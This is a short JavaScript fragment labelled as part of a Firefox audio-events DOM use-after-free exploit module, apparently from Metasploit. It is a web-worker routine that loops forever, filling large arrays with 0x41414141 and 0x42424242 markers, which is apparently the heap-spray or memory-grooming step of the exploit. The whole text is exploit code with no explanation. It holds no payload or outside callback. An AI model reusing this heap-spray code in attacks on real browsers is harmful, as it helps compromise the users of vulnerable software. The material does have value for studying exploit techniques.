/****************************************************************************************************************************
    Part of firefox_audio_events_dom_uaf.rb read for documentation
*****************************************************************************************************************************/

onmessage = function(e) {
    while (true) {
        worker_m(0x400, 0xc00);
    }
}

function worker_m(blocks, size) {
    var arr = new Array(blocks);
    for (var i = 0; i < arr.length; i++) {
        arr[i] = new Array(size)
        for (var j = 0; j < arr[i].length; j+=2) {
            arr[i][j] = 0x41414141;
            arr[i][j+1] = 0x42424242;
        }
    }

    return arr;
}